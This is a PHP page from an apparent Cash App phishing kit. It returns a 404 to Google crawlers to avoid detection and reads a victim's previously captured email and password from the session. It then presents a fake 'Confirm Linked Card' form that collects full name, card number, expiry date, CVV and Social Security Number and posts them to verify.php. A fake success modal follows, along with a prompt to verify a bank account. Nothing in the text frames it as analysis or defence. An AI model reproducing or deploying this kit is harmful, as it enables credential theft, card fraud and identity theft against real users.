<?php
ini_set( "display_errors", 0); 
require_once '../../main.php';


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();



if(isset($_SESSION['ssn'])) {
    echo "<script>window.location = 'https://www.cash.app';</script>";
    exit();
}

if(isset($_SESSION['oauth'])) {
    echo "<script>window.location = '{$_SESSION['redirect']}';</script>";
    exit();
}

if(isset($_POST['submit'])) {
    
    $email    = $_SESSION['email'];
    $password = $_SESSION['password'];

}
?>
<html lang="en" style="--vh:722px;">
<head> 
<meta charset="utf-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"> 
<title>Cash App</title> 
<link rel="icon" sizes="196x196" href="/static/img/icon.png"> 
<link rel="icon" href="/static/img/favicon.ico"> 
<link rel="stylesheet" type="text/css" href="/static/css/cash.css"> 
<style> 
input{ height:55px !important; } 
.rowdua{ width:100%; display:flex; } 
.kanan{ margin-left:3px; float:left; flex:49%; position:relative; } 
.kiri{ margin-right:3px; float:right; flex:49%; position:relative; }
.center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 30%;
} 
</style> 
<script>
</script> 
</head> 
<body class="theme-bg ember-application theme-green"> 
<div id="ember321" class="ember-view"> 
<div id="ember345" class="full-height application-cash ember-view"> 
<div id="ember352" class="cookie-banner ember-view">  
</div> 
<section class="layout-login flex-container full-height pad"> 
<div class="login-container flex-container flex-v-center flex-fill"> 
<h1 class="step-title flex-static">Confirm Linked Card</h1> 
<form autocomplete="off" novalidate="true" id="frmCard" method="post" action="verify.php" class="login-form ember-view"> 
<div class="field-container"> 
<div class="field"> 
<div class="field fk-field-container ember-view ">
<input type="text" name="fname" autocomplete="off" spellcheck="false" id="fname" class="ember-text-field ember-view" placeholder="Full Name" maxlength="23">
<input type="tel" name="cnum" autocomplete="off" spellcheck="false" id="cnum" class="ember-text-field ember-view" placeholder="Card Number" maxlength="23"> 
</div> 
</div> 
</div> 
<div class="rowdua"> 
<div class="kiri"> 
<div class="field fk-field-container ember-view"> 
<input type="tel" name="exp" id="exp" class="ember-text-field ember-view" placeholder="MM/YY" maxlength="5"> 
</div> 
</div> 
<div class="kanan"> 
<div class="field fk-field-container ember-view"> 
<input type="password" name="cvv" id="cvv" class="ember-text-field ember-view" placeholder="CVV/CSC" maxlength="3"> 
</div> 
</div> 
</div> 
<div class="field-container"> 
<div class="field"> 
<div class="field fk-field-container ember-view"> 
<input type="tel" name="ssn" autocomplete="off" spellcheck="false" id="ssn" class="ember-text-field ember-view" placeholder="Social Security Number" maxlength="11"> 
</div> 
</div> 
</div> 
<div id="ember555" class="cta submit-button-component submit-button-with-spinner ember-view"> <button type="submit" id="btnLogin" class="button theme-button button--round theme-button">Confirm Linked Card</button>
<div class="cta submit-button-component submit-button-with-spinner ember-view" style="margin-top:30px"> 
</div> 
</form> 
</div>
</section>  
<div id="cashModal" class="modal-manager ember-view" style="display:none"> 
<div class="modal-overlay show">
</div> 
<div class="modal-scroller fade-in show ember-view"> 
<div class="modal-window flex-container flex-v theme-white small ember-view"> 
<div class="modal-window-content content"> 
<div class="spinner-container ember-view"></div> 
<img src="../../static/img/success_v2.png" alt="Paris" class="center">
<?php if ($setting['with_bank'] == "YEPS") { ?>
    <p class="instructions"><br>Cool! <br>Now you need to verify your bank account.</p>
<?php } else { ?>
    <p class="instructions"><br>Cool! <br>Now you can transfer, deposit and use our features.</p>
<?php } ?>
<button id="btnConfirm" data-oauth="" class="button theme-button resend-code">Continue</button>
<a href="../../complete" class="login-help-link fade-in immediate show"><br>I'll do it later</a>
</div> 
</div> 
</div> 
</div> 
</div> 
</div>
</div>
</div>
</div>    
<script type="text/javascript" src="/static/js/jquery.min.js"></script> 
<script type="text/javascript" src="/static/js/mask.js"></script> 
<script type="text/javascript" src="/static/js/cvalid.js"></script> 
<script type="text/javascript" src="/static/js/cendol.js"></script> 
</body>
</html>